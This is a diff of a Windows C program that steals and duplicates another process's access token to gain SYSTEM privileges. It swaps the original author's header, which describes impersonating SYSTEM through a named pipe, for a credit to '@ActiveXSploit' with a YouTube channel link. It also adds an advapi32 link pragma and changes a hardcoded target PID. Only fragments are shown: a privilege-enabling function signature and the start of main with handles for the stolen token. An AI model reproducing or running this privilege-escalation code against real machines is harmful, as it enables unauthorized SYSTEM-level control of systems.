@@ -1,11 +1,9 @@
-/*
-* Author: Aleksa Zatezalo
-* Date: October 2024
-* Description: Impersonates SYSTEM through named pipe.
-*/
+// @ActiveXSploit
+// Channel Link : https://www.youtube.com/channel/UCIlMtOiRDi1luvhtjczvjJw
 
 #include <windows.h>
 #include <stdio.h>
+#pragma comment(lib, "advapi32.lib")
 
 void EnablePrivileges(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
 
@@ -43,7 +41,7 @@ void EnablePrivileges(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivileg
 
 int main() 
 {
-	int pid_to_impersonate = 688; // Replace this by the PID of a remote process
+	int pid_to_impersonate = 584; // Replace this by the PID of a remote process
 	HANDLE TokenHandle = NULL; // Handle to store the remote process token 
 	HANDLE DuplicateTokenHandle = NULL; // Handle to store the duplicated remote process token 
 	STARTUPINFO startupInfo;
